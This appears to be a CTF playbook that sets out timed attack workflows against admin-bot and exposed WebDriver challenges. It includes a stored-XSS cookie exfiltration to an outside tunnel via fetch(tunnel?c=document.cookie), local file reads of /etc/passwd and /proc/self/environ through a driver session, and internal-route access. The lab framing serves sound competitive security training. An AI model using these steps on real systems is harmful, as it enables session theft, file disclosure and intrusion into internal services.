# Workflow scenarios — the run, by situation

## Scenario 1: report-form bot + stored XSS flag-cookie

The canonical CTF shape. A stored field the admin bot renders; the flag
is the bot's cookie.

```
0-5m:   read bot.js -> {url:your_note, cookie:flag, wait:5s, flags:[no-sandbox]}
5-15m:  local driver + flags -> set flag cookie -> goto the note page
15-25m: hooks on -> canary console.log -> fires
25-40m: develop the cookie exfil -> fetch(tunnel?c=document.cookie)
40-45m: goto own tunnel inside driver -> channel live
45-55m: fire the stored payload at the live bot -> listener gets flag
55-60m: pre-flag the value -> DELETE session -> done
```

## Scenario 2: exposed driver port + flag in a file

```
0-5m:   POST :9515/session -> sessionId (surface live)
5-15m:  primitive map -> file read live (file:///etc/passwd works)
15-30m: file:///flag -> source -> flag text in <pre>
30-35m: pre-flag -> DELETE -> done
```

Or, `/flag` guesses miss:

```
15-30m: file:///proc/self/environ -> source -> FLAG=... env var -> the path
30-40m: file://<path> -> source -> flag
```

## Scenario 3: exposed endpoint, flag on an internal route

```
0-5m:   POST /session -> sessionId
5-15m:  nav localhost/admin -> source -> an admin panel renders
15-30m: nav localhost/api/flag (or execute fetch) -> flag in source
30-35m: pre-flag -> DELETE
```

## Scenario 4: bot flow, egress blocked

```
0-25m:  reproduce -> develop the payload -> confirmed locally
25-30m: goto own tunnel -> interstitial (channel dead)
30-40m: pivot: payload writes flag to a same-origin store (profile/note)
40-50m: fire live -> bot's write stores the flag
50-60m: fetch the store -> flag -> pre-flag
```

## Scenario 5: bot flow, flag needs the bot's auth page

```
0-5m:   bot source -> bot visits flag-page holding flag cookie
5-15m:  reproduce -> bot's authed page renders the flag
15-30m: payload reads the flag page (fetch '/flag' in bot's context) -> exfil
30-45m: confirmed locally -> channel check -> fire live -> listener
45-60m: pre-flag
```

## Scenario 6: no endpoint, no bot — the dead class

```
0-5m:   POST /session refused on all ports; no report/admin flow
5-10m:  JS canary to "the bot" -> no JS/DOM/cookies -> it's a server fetch
10-15m: record: class dead -> route to ../web-ssrf/ or the payload's class
```

## The scenario-to-time map

| Scenario | Bottleneck |
|---|---|
| 1 (XSS+cookie) | payload development — the loop |
| 2 (file read) | the flag-path guess — try environ |
| 3 (loopback) | finding the internal route |
| 4 (egress) | the channel pivot — write-back |
| 5 (auth page) | reproducing the auth + the read |
| 6 (dead) | detection — cheap, then route out |
